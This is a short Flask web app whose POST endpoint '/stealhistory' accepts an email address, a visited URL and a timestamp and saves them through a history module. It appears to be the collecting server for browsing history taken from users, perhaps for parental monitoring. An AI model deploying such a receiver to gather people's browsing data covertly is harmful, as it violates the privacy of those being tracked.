
from flask import Flask, render_template, request, session, redirect, url_for
import history

app = Flask(__name__)

@app.route("/")
def hello():
    return "Hello World!"


@app.route("/stealhistory", methods=['POST'])
def parent_login():
    if request.method == 'POST':
        email = request.form['email']
        url = request.form['url']
        time = request.form['last_visited']
        history.addToHistory(email, url, time)
        return "\n\n\nWe added to history: " + email